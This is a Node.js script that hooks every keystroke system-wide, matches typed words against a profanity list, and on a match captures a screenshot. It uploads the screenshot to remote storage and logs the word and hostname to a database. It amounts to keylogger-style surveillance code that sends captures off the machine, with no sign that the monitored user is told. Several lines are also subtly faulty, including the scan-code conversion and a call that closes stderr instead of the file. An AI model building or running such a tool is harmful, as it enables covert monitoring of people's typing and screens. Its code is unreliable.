import { Screenshots } from "node-screenshots";
import fs from "fs"
import badwords from "badwords";
import { GlobalKeyboardListener } from "node-global-key-listener";
import { writeUserData } from "./dbConfig.js";
import os from "os"
import { uploadFile } from "./storageConfig.js";
let currentWord = []

const listener = new GlobalKeyboardListener()

listener.addListener((e) => {
  if (e.state === "UP" && e._raw.startsWith("KEYBOARD")) {
    const key = String.fromCharCode(e.scanCode)
    currentWord.push(key)
    if (key === " ") {
      currentWord = []
    } else {
        const checkWord = currentWord.join("").trim().toLowerCase()
        if (badwords.includes(checkWord)) {
           captureScreenshot().then(async({userId,basePath,filename})=>{
             await writeUserData(userId,`${basePath}/${filename}`,filename,checkWord,os.hostname())
             currentWord = []
          }).catch((err)=>console.log("Error in capturing screenshot: ", err))
        }
    }
  }


})

const captureScreenshot = () => {
  return new Promise(async(res,rej)=>{
    // Async capture
    const capturer = Screenshots.fromPoint(100, 100);
    const image = await capturer.capture();
    const userId = + +new Date()
    const filename = `ss-${userId}.png`
    const basePath = import.meta.dirname
    fs.writeFileSync(`./${filename}`, image);
    const file = fs.readFileSync(`./${filename}`)
    await uploadFile(file,filename)
    fs.rm(`./${filename}`,(err)=>console.log("ERROR DELETING FILE",err))
    fs.close(2,()=>console.log("File Deleted!"))
    res({userId,basePath,filename})
  })
}
